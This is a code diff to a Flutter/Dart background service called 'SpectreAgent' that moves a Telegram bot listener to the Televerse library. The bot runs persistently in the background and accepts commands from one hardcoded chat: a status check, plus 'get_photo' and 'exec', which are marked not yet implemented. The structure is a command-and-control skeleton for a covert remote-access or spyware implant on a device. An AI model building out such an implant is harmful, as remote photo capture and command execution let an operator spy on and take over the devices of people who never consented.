@@ -2,7 +2,6 @@ import 'dart:async';
 import 'dart:ui';
 import 'package:flutter/widgets.dart';
 import 'package:flutter_background_service/flutter_background_service.dart';
-// Import the new library
 import 'package:televerse/televerse.dart';
 
 // TODO: REPLACE THESE WITH YOUR ACTUAL BOT TOKEN AND CHAT ID
@@ -13,15 +12,18 @@ const int CHAT_ID = -1002941249156; // Get this from a bot like @userinfobot
 void onStart(ServiceInstance service) async {
   DartPluginRegistrant.ensureInitialized();
 
-  // The setup is slightly different with Televerse
   final bot = Bot(BOT_TOKEN);
 
-  // The main listener setup
-  bot.onMessage((message) async {
-    // Only listen to commands from our specified chat
-    if (message.chat.id != CHAT_ID) return;
+  // 'ctx' is the "Context" - the wrapper
+  bot.onMessage((ctx) async {
+    // First, check if there's actually a message in the context
+    if (ctx.message == null) return;
+    
+    // We access the message using 'ctx.message'
+    // The '!' tells the compiler we know it's not null because we just checked.
+    if (ctx.message!.chat.id != CHAT_ID) return;
 
-    final text = message.text?.toLowerCase() ?? '';
+    final text = ctx.message!.text?.toLowerCase() ?? '';
     final parts = text.split(' ');
     final command = parts[0];
 
@@ -30,26 +32,25 @@ void onStart(ServiceInstance service) async {
     try {
       switch (command) {
         case 'get_status':
-          // The reply method is slightly different
-          await message.reply('SpectreAgent is online. Status: OK.');
+          // We reply using the context's helper method
+          await ctx.reply('SpectreAgent is online. Status: OK.');
           break;
         
         case 'get_photo':
-          await message.reply('get_photo command received. Not implemented yet.');
+          await ctx.reply('get_photo command received. Not implemented yet.');
           break;
         case 'exec':
-          await message.reply('exec command received. Not implemented yet.');
+          await ctx.reply('exec command received. Not implemented yet.');
           break;
 
         default:
-          await message.reply('Unknown command: $command');
+          await ctx.reply('Unknown command: $command');
       }
     } catch (e) {
       await bot.api.sendMessage(ChatID(CHAT_ID), 'FUCK. Error executing command: $e');
     }
   });
 
-  // Start the bot
   bot.start();
   service.invoke('update', {'message': 'SpectreAgent is listening...'});
 }
